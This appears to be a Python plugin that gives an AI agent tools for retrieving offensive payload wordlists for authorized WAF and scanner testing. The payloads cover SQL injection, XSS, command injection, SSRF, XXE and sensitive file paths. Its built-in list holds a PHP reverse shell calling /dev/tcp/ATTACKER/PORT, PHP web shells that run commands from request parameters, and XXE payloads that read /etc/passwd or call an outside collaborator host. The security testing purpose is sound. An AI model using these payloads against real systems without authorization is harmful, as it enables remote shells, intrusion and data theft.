"""
ARGOS Plugin: Offensive Payloads Library
Payload wordlists for authorized security testing: WAF validation, DAST, vuln scanning.
Source: InfoSecWarrior/Offensive-Payloads + PayloadsAllTheThings

Use cases:
  - Testing WAF/IDS rules (do they block known SQLi/XSS patterns?)
  - Providing input to web scanners (nuclei, sqlmap, etc.)
  - Generating test vectors for pen test reports

To use local copies, clone the repo:
  git clone https://github.com/InfoSecWarrior/Offensive-Payloads /opt/argos/payloads

Without a local clone, payloads are fetched from GitHub raw (cached in memory).

⚠️  FOR AUTHORIZED SECURITY TESTING AND DEFENSIVE VALIDATION ONLY.
"""
from __future__ import annotations
import json, os, re, urllib.request
from pathlib import Path
from typing import Optional

MANIFEST = {
    "id":          "offensive_payloads",
    "name":        "Offensive Payloads",
    "description": "Payload wordlists for authorized WAF testing and security validation: SQLi, XSS, CMDi, SSRF, XXE, path traversal.",
    "version":     "1.0.0",
    "author":      "ARGOS",
    "requires":    [],
}

_LOCAL_DIR  = Path(os.getenv("ARGOS_PAYLOADS_DIR", "/opt/argos/payloads"))
_GITHUB_RAW = "https://raw.githubusercontent.com/InfoSecWarrior/Offensive-Payloads/main"

# Canonical category → filename mapping
_CATEGORIES: dict[str, list[str]] = {
    "xss":              ["Cross-Site-Scripting-XSS-Payloads.txt"],
    "sqli":             ["SQL-Injection-Payloads.txt"],
    "sqli-auth-bypass": ["SQL-Injection-Auth-Bypass-Payloads.txt"],
    "cmdi-linux":       ["OS-Command-Injection-Unix-Payloads.txt"],
    "cmdi-windows":     ["OS-Command-Injection-Windows-Payloads.txt"],
    "path-traversal":   ["Directory-Traversal-Payloads.txt"],
    "ssrf":             ["Server-Side-Request-Forgery-Payloads.txt"],
    "php-injection":    ["PHP-Code-Injections-Payloads.txt"],
    "xxe":              ["XML-External-Entity-(XXE)-Payloads.md"],
    "html-injection":   ["Html-Injection-Payloads.txt"],
    "sensitive-files-linux":   ["Linux-Sensitive-Files.txt"],
    "sensitive-files-windows": ["Windows-Sensitive-Files.txt"],
    "log-files-linux":         ["Linux-Log-Files.txt"],
    "log-files-windows":       ["Windows-Log-Files.txt"],
    "file-extensions":  ["File-Extensions-Wordlist.txt"],
    "mime-types":       ["Media-Type-(MIME).txt"],
    # Also include PayloadsAllTheThings classics (built-in, no external fetch)
    "reverse-shell-php": None,  # built-in
    "oob-xxe":          None,   # built-in
}

# Built-in payloads for categories not in the remote repo
_BUILTIN: dict[str, list[str]] = {
    "reverse-shell-php": [
        "<?php exec('/bin/bash -c \"bash -i >& /dev/tcp/ATTACKER/PORT 0>&1\"'); ?>",
        "<?php system($_GET['cmd']); ?>",
        "<?php passthru($_GET['cmd']); ?>",
        "<?php shell_exec($_GET['cmd']); ?>",
    ],
    "oob-xxe": [
        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://COLLABORATOR/\">]><foo>&xxe;</foo>",
        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
    ],
}

# In-memory cache: category → list of payloads
_cache: dict[str, list[str]] = {}


def _fetch_payloads(filename: str) -> list[str]:
    """Fetch payload list from local clone or GitHub raw."""
    # Try local first
    local = _LOCAL_DIR / filename
    if local.exists():
        raw = local.read_text(errors="replace")
        return [ln.strip() for ln in raw.splitlines() if ln.strip() and not ln.startswith("#")]

    # Fetch from GitHub
    url = f"{_GITHUB_RAW}/{urllib.request.quote(filename)}"
    try:
        req = urllib.request.Request(url, headers={"User-Agent": "ARGOS/1.0"})
        with urllib.request.urlopen(req, timeout=15) as r:
            raw = r.read().decode(errors="replace")
        return [ln.strip() for ln in raw.splitlines() if ln.strip() and not ln.startswith("#")]
    except Exception:
        return []


def get_payloads(category: str, limit: int = 100, filter_pattern: str = "") -> dict:
    """Get payload wordlist for a vulnerability category.
    For authorized security testing: WAF validation, scanner input, pentest report generation.

    Categories: xss, sqli, sqli-auth-bypass, cmdi-linux, cmdi-windows, path-traversal,
                ssrf, php-injection, xxe, html-injection, sensitive-files-linux,
                sensitive-files-windows, log-files-linux, log-files-windows,
                file-extensions, mime-types, reverse-shell-php, oob-xxe
    """
    cat = category.lower().strip()
    if cat not in _CATEGORIES:
        return {
            "error":       f"Unknown category '{cat}'",
            "categories":  sorted(_CATEGORIES.keys()),
        }

    # Load from cache or fetch
    if cat not in _cache:
        files = _CATEGORIES[cat]
        if files is None:
            # Built-in
            _cache[cat] = _BUILTIN.get(cat, [])
        else:
            payloads: list[str] = []
            for fname in files:
                payloads.extend(_fetch_payloads(fname))
            _cache[cat] = payloads

    payloads = _cache[cat]

    # Apply optional regex filter
    if filter_pattern:
        try:
            rx = re.compile(filter_pattern, re.IGNORECASE)
            payloads = [p for p in payloads if rx.search(p)]
        except re.error as e:
            return {"error": f"Invalid filter_pattern regex: {e}"}

    total = len(payloads)
    subset = payloads[:min(limit, 500)]

    return {
        "category":     cat,
        "source":       "InfoSecWarrior/Offensive-Payloads",
        "total":        total,
        "returned":     len(subset),
        "payloads":     subset,
        "usage_note":   "For authorized security testing (WAF validation, DAST, pentest report) only.",
    }


def list_payload_categories() -> dict:
    """List all available payload categories with descriptions."""
    descriptions = {
        "xss":                   "Cross-Site Scripting injection payloads",
        "sqli":                  "SQL Injection payloads",
        "sqli-auth-bypass":      "SQL Injection authentication bypass strings",
        "cmdi-linux":            "OS Command Injection — Unix/Linux",
        "cmdi-windows":          "OS Command Injection — Windows",
        "path-traversal":        "Directory/path traversal (../../etc/passwd)",
        "ssrf":                  "Server-Side Request Forgery payloads",
        "php-injection":         "PHP code injection payloads",
        "xxe":                   "XML External Entity injection payloads",
        "html-injection":        "HTML injection payloads",
        "sensitive-files-linux": "Linux sensitive file paths (/etc/passwd, /etc/shadow, etc.)",
        "sensitive-files-windows": "Windows sensitive file paths (SAM, NTDS.dit, etc.)",
        "log-files-linux":       "Linux log file paths",
        "log-files-windows":     "Windows log file paths",
        "file-extensions":       "File extension wordlist",
        "mime-types":            "MIME type wordlist",
        "reverse-shell-php":     "PHP reverse shell templates (built-in)",
        "oob-xxe":               "Out-of-band XXE payloads (built-in)",
    }
    return {
        "source":     "InfoSecWarrior/Offensive-Payloads",
        "categories": [
            {"name": cat, "description": desc}
            for cat, desc in descriptions.items()
        ],
        "local_dir":  str(_LOCAL_DIR),
        "local_exists": _LOCAL_DIR.exists(),
        "install_tip": (
            "Clone locally for offline use: "
            "git clone https://github.com/InfoSecWarrior/Offensive-Payloads /opt/argos/payloads"
        ),
    }


TOOLS = {
    "get_payloads": {
        "fn": get_payloads,
        "description": (
            "Get payload wordlists for authorized security testing: WAF validation, DAST inputs, pentest vectors. "
            "Categories: xss, sqli, sqli-auth-bypass, cmdi-linux, cmdi-windows, path-traversal, ssrf, "
            "php-injection, xxe, html-injection, sensitive-files-linux/windows, reverse-shell-php, oob-xxe. "
            "Fetches from local clone (/opt/argos/payloads) or GitHub. FOR AUTHORIZED TESTING ONLY."
        ),
        "parameters": {
            "type": "object",
            "properties": {
                "category":       {"type": "string",  "description": "Payload category (e.g. 'sqli', 'xss', 'path-traversal')"},
                "limit":          {"type": "integer", "description": "Max payloads to return (default: 100, max: 500)"},
                "filter_pattern": {"type": "string",  "description": "Optional regex to filter payloads (e.g. 'UNION|SELECT')"},
            },
            "required": ["category"]
        }
    },
    "list_payload_categories": {
        "fn": list_payload_categories,
        "description": "List all available payload categories (XSS, SQLi, CMDi, path traversal, SSRF, XXE, etc.) with descriptions.",
        "parameters": {
            "type": "object",
            "properties": {},
            "required": []
        }
    },
}
